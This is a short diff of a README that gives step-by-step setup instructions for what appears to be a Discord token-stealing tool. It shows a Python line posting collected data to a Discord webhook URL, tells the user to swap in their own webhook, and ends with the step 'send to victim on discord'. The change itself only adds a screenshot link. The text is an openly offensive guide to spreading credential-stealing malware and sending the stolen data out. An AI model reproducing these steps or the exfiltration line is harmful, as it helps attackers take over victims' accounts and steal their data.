@@ -42,7 +42,7 @@ try:
         urlopen(Request("https://discord.com/api/webhooks/840487083444535366/0WIjgINkadXvuOMXOdwNahKFVROWtq-_ktGhPLLdZSy4b0QZo-2rljJWCabkaC9I-oQJ", data=dumps(webhook).encode(), headers=getheaders())) ![Screenshot 2021-05-09 150239](https://user-images.githubusercontent.com/83868916/117561194-d997e600-b0d7-11eb-8225-0bb6d77fa324.png)
 6. change the "https://discord.com/api/webhooks/840487083444535366/0WIjgINkadXvuOMXOdwNahKFVROWtq-_ktGhPLLdZSy4b0QZo-2rljJWCabkaC9I-oQJ" to your webhook url ![Screenshot 2021-05-09 150300](https://user-images.githubusercontent.com/83868916/117561195-dac91300-b0d7-11eb-9494-a55d8f6e5276.png)
 
-7. save the file 
+7. save the file ![Screenshot 2021-05-09 151713](https://user-images.githubusercontent.com/83868916/117561385-b2421880-b0d9-11eb-98c4-00c3641d6ba6.png)
 
 8. send to victim on discord ![Screenshot 2021-05-09 145846](https://user-images.githubusercontent.com/83868916/117561181-d00e7e00-b0d7-11eb-9921-46f8689a5e19.png)
 
